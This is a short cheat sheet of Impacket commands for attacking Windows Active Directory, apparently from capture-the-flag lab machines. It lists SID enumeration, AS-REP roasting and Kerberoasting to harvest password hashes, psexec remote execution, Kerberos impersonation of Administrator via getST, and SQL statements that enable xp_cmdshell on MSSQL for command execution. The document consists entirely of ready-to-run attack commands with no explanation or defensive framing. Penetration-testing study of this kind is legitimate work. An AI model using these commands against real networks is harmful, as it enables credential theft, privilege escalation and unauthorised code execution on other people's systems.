# Impacket

## Impacket-lookupsid
```bash
impacket-lookupsid domain/guest@$ip
```

## Impacket-GetNPUsers
```
impacket-GetNPUsers vulnet-rst.local/ -no-pass -userfile users.txt
```

## Impacket-psexec
```
impacket-psexec vulnnet-rst.local/a-whitehat@10.10.216.107
```

## Impacket-GetUserSPNs
```
impacket-GetUserSPNs vulnnet-rst.local/$username:$password -dc-ip $ip -request
```

## Impacket-getST
```
impacket-getST -k -impersonate Administrator -spn cifs/HayStack.thm.corp thm.corp/DARLA_WINTERS
```

## Impacket-mssqlclient
```
SQL (ARCHETYPE\sql_svc  dbo@master)> select is_srvrolemember('sysadmin');
```

### Configure if xp_cmdshell is not activated
```
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure; - Enabling the sp_configure as stated in the above error message
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```
